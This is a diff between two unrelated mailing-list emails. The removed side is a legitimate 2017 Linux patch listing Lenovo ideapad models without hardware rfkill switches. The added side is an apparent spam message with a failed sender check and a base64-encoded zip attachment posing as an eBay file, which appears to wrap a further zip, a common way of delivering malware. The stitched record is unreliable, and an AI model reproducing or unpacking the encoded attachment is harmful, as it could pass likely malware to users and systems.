@@ -1,125 +1,61 @@
-From: yjx@flygoat.com
-Subject: [PATCH v3] ideapad-laptop: Add several models to no_hw_rfkill
-Date: Tue,  4 Jul 2017 14:39:19 +0000
-Message-ID: <20170704143919.2942-1-yjx@flygoat.com>
+From: <angers@pythagorejiujitsu.com>
+Subject: (unknown)
+Date: Wed, 05 Jul 2017 06:42:45 -0000
+Message-ID: <149923696550.12492.156427221884131995@zaural.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="EBAY_1112994_platform-driver-x86.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from forward16h.cmail.yandex.net ([87.250.230.158]:48425 "EHLO
-        forward16h.cmail.yandex.net" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1750841AbdGEFuP (ORCPT
+Received: from ws145.zone31-163-150.zaural.ru ([31.163.150.145]:33935 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750796AbdGEGmt (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Wed, 5 Jul 2017 01:50:15 -0400
+        Wed, 5 Jul 2017 02:42:49 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: ike.pan@canonical.com
-Cc: dvhart@infradead.org, andy@infradead.org, platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org, Yang Jiaxun <yjx@flygoat.com>
+To: platform-driver-x86@vger.kernel.org
 
-From: Yang Jiaxun <yjx@flygoat.com>
-
-Some Lenovo ideapad models do not have hardware rfkill switches, but
-trying to read the rfkill switches through the ideapad-laptop module.
-It caused to always reported blocking breaking wifi.
-
-Fix it by adding those models to no_hw_rfkill_list.
-
-Signed-off-by: Yang Jiaxun <yjx@flygoat.com>
----
- drivers/platform/x86/ideapad-laptop.c | 70 +++++++++++++++++++++++++++++++++++
- 1 file changed, 70 insertions(+)
-
-diff --git a/drivers/platform/x86/ideapad-laptop.c b/drivers/platform/x86/ideapad-laptop.c
-index 24ca9fbe31cc..5f4515b88a18 100644
---- a/drivers/platform/x86/ideapad-laptop.c
-+++ b/drivers/platform/x86/ideapad-laptop.c
-@@ -869,6 +869,27 @@ static const struct dmi_system_id no_hw_rfkill_list[] = {
- 		},
- 	},
- 	{
-+		.ident = "Lenovo V310-14IKB",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo V310-14IKB"),
-+		},
-+	},
-+	{
-+		.ident = "Lenovo V310-14ISK",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo V310-14ISK"),
-+		},
-+	},
-+	{
-+		.ident = "Lenovo V310-15IKB",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo V310-15IKB"),
-+		},
-+	},
-+	{
- 		.ident = "Lenovo V310-15ISK",
- 		.matches = {
- 		        DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-@@ -876,6 +897,48 @@ static const struct dmi_system_id no_hw_rfkill_list[] = {
- 		},
- 	},
- 	{
-+		.ident = "Lenovo ideapad 300-15IBR",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo ideapad 300-15IBR"),
-+		},
-+	},
-+	{
-+		.ident = "Lenovo ideapad 300-15IKB",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo ideapad 300-15IKB"),
-+		},
-+	},
-+	{
-+		.ident = "Lenovo ideapad 300S-11IBR",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo ideapad 300S-11BR"),
-+		},
-+	},
-+	{
-+		.ident = "Lenovo ideapad 310-15ABR",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo ideapad 310-15ABR"),
-+		},
-+	},
-+	{
-+		.ident = "Lenovo ideapad 310-15IAP",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo ideapad 310-15IAP"),
-+		},
-+	},
-+	{
-+		.ident = "Lenovo ideapad 310-15ISK",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo ideapad 310-15ISK"),
-+		},
-+	},
-+	{
- 		.ident = "Lenovo ideapad 310-15IKB",
- 		.matches = {
- 		        DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-@@ -883,6 +946,13 @@ static const struct dmi_system_id no_hw_rfkill_list[] = {
- 		},
- 	},
- 	{
-+		.ident = "Lenovo ideapad Y700-14ISK",
-+		.matches = {
-+			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
-+			DMI_MATCH(DMI_PRODUCT_VERSION, "Lenovo ideapad Y700-14ISK"),
-+		},
-+	},
-+	{
- 		.ident = "Lenovo ideapad Y700-15ACZ",
- 		.matches = {
- 			DMI_MATCH(DMI_SYS_VENDOR, "LENOVO"),
--- 
-2.13.2
+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
